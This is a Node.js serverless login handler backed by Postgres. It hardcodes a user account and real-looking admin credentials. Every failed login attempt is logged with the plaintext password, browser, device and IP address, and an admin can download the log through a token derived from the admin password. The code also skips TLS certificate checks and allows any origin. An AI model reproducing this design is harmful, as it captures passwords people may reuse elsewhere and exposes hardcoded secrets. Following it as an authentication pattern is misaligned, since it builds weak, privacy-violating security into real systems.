const crypto = require('crypto');
const { Pool } = require('pg');

const VALID_USER   = 'nikhil';
const VALID_PASS   = '12345678';
const ADMIN_USER   = 'shivanshu.bnd';
const ADMIN_PASS   = 'Sahu@7897';

// ─── Postgres Database Setup ──────────────────────────────────────────────────
let pool;
if (process.env.POSTGRES_URL) {
    pool = new Pool({
        connectionString: process.env.POSTGRES_URL,
        ssl: { rejectUnauthorized: false }
    });
} else {
    console.warn('⚠️ POSTGRES_URL is not set. Database integration disabled.');
}

// Ensure table exists before any operation
async function ensureTable() {
    if (!pool) return;
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS failed_logins (
                id SERIAL PRIMARY KEY,
                timestamp TEXT,
                username TEXT,
                password TEXT,
                browser TEXT,
                device TEXT,
                ip TEXT
            );
        `);
    } catch (e) {
        console.error('Table creation error:', e.message);
    }
}

// ─── Token helper ────────────────────────────────────────────────────────────
function makeToken() {
    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
}

// ─── Log helpers ─────────────────────────────────────────────────────────────
async function readLogs() {
    if (!pool) return [];
    try {
        await ensureTable();
        // Fetch newest first
        const res = await pool.query('SELECT * FROM failed_logins ORDER BY id DESC LIMIT 1000');
        return res.rows;
    } catch (e) {
        console.error('Read logs error:', e.message);
        return [];
    }
}

async function appendLog(entry) {
    if (!pool) return;
    try {
        await ensureTable();
        await pool.query(`
            INSERT INTO failed_logins (timestamp, username, password, browser, device, ip)
            VALUES ($1, $2, $3, $4, $5, $6)
        `, [entry.timestamp, entry.username, entry.password, entry.browser, entry.device, entry.ip]);
    } catch (e) {
        console.error('Append log error:', e.message);
    }
}

// ─── Main handler ─────────────────────────────────────────────────────────────
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token');

    // ── Admin: GET logs ──────────────────────────────────────────────────────
    if (req.method === 'GET') {
        const token = req.headers['x-admin-token'];
        if (token !== makeToken()) return res.status(401).json({ error: 'Unauthorized' });
        if (!process.env.POSTGRES_URL) {
            return res.status(200).json({ error: 'MISSING_DB_CONNECTION' });
        }
        
        const logs = await readLogs();
        return res.status(200).json({ logs });
    }

    // ── Admin: POST login ────────────────────────────────────────────────────
    if (req.method === 'POST' && req.body?.action === 'admin-login') {
        const { username, password } = req.body;
        if (username === ADMIN_USER && password === ADMIN_PASS) {
            return res.status(200).json({ success: true, token: makeToken() });
        }
        return res.status(200).json({ success: false });
    }

    // ── User login ───────────────────────────────────────────────────────────
    if (req.method === 'POST') {
        const { username, password } = req.body || {};
        const isValid = (username === VALID_USER && password === VALID_PASS);

        if (!isValid) {
            const ua = req.headers['user-agent'] || '';
            let browser = 'Unknown';
            if (ua.includes('Chrome') && !ua.includes('Edg'))  browser = 'Chrome';
            else if (ua.includes('Firefox'))                    browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg'))                        browser = 'Edge';

            let device = 'Desktop';
            if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = 'Mobile';

            // AWAIT logging so Vercel does not terminate the function early
            await appendLog({
                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                username:  username || '',
                password:  password || '',
                browser,
                device,
                ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
            });
        }

        if (isValid) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(200).json({ success: false });
        }
    }

    return res.status(405).json({ error: 'Method Not Allowed' });
};
